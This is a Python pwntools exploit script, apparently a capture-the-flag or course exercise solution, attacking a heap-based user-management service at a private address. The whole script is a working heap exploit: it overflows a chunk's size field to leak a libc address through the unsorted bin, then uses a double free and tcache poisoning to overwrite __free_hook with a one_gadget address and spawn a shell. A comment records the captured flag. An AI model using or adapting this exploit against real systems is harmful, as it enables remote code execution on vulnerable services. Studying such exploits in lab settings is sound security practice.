#!/bin/env python3
from pwn import *
from pwnlib.libcdb import *

# connects to the server
p = remote("10.21.232.108", 5551)

# we strip the libc.so.6 file to get the offset of main_arena
print(unstrip_libc("./libc.so.6"))

# we then load the unstripped libc.so.6 file
elf = ELF("libc.so.6")

# the main_arena offset is loaded
main_arena = elf.symbols.main_arena

print(main_arena)


# helper functions to send the commands
def add(username, lvl):
    p.sendlineafter(b"e[x]it program", b'a')
    p.sendlineafter(b"Enter user name" , username)
    p.sendlineafter(b"Enter user privilege level from 1 (highest) to 4 (lowest)", lvl)
    
def remove(id):
    p.sendlineafter(b"e[x]it program", b'r')  
    p.sendlineafter(b':', id)
    
def pri():
    p.sendlineafter(b"e[x]it program", b'p')

def exi():
    p.sendlineafter(b"e[x]it program", b'x')


# overflowing the size field for the chuck to go to unsorted list when freed 
add(b'1', b'1')    # users[0] 1 (1)
add(b'2', b'2')    # users[1] 2 (2) -> size
add(b'3', b'3')    # users[2] 3 (3) 

for i in range(40):     # random allocations to make the fake chunck seem legit
    add(b'a', b'4')     # this set the prev size bit inuse for the fake chunck

remove(b'1')       # removes users[0]

add(b'A'*23 + b'\x00' + b'\x01\x05\x00\x00\x00\x00\x00', b'1')   # adds users[0] A*23 (1) and overwrites the size bytes of the next chunck

# since the size bit of the second is set to 0x500 thus this will directly go to the unsorted bin
remove(b'2')

# The forward pointer of the last node in the unsorted bin points to the main_arena
# The main arena is present  in the libc, hence leaking the libc address
# we retrive this main_arena+96 pointer using the print function
pri()


p.recvline()    
p.recvline()
LIBC_main_arena = int(bytes(reversed(p.recvline().split()[1])).hex(),16) - 96 # extracts main arena address
print(LIBC_main_arena)

# we calculate the base address of the libc using the offset of the main_arena
LIBC_base = LIBC_main_arena - main_arena
print(hex(LIBC_base))

add(b'some', b'2') # adds at pos 2 to make a legit chuck because it initially contained fake unsorted chunck


# we now apply the same method as done in the second question to spawn a shell
remove(b'11')
remove(b'10')
remove(b'9')
remove(b'8')
remove(b'7')
remove(b'6')
remove(b'5')

remove(b'1')
remove(b'2')
remove(b'1')

for i in range(7):
    add(b'a', b'1')
    
add(p64(LIBC_base + elf.sym.__free_hook), b'1')
add(b'soham', b'2')
add(b'soham', b'2')
offset = 0x4f302
add(p64(LIBC_base + offset), b'1')
remove(b'1')

# flag AfrPBSRuOI
    


# print(elf.sym.__malloc_hook)
# print(elf.sym.__free_hook)
# print(elf.sym.system)
# print(hex(next(elf.search(b"/bin/sh"))))

p.interactive()



